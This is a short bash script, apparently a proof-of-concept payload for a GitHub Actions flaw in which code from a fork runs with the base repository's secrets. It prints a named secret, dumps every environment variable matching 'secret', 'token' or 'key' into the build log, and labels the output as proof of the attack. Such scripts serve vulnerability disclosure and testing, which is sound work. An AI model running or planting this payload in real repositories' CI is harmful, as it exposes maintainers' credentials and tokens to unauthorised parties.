#!/bin/bash
echo "===== ATTACKER CODE EXECUTING IN BASE REPO CONTEXT ====="
echo "TEST_SECRET value is: ${TEST_SECRET}"
echo ""
echo "===== ALL SECRETS/TOKENS IN ENV ====="
env | grep -iE "secret|token|key" || echo "none found"
echo ""
echo "===== PROOF: fork code ran with base repo secrets ====="
echo "github context: ${GITHUB_REPOSITORY}"
